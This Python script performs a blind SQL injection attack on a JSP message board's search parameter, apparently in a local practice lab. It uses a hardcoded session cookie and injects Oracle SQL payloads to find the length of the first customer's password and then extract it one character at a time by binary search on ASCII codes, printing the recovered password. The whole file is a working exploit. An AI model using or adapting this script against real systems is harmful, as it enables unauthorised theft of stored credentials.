import requests

url = "http://localhost:8000/SQL3/board.jsp"
cookie = {'JSESSIONID': '5DB16415D7EB29B84BD75497CB9A9473'}

def find_length():
    pwlength = 70

    while True:
        param = {"search": "dd' AND (SELECT LENGTH(password) AS password_length FROM customer WHERE ROWNUM = 1)={} --".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "mas9623" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"search": "dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),{},1))={} --".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "mas9623" in req.text:
                password += chr(value)
                break
            else:
                param = {"search": "dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=1),{},1))>{} --".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "mas9623" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()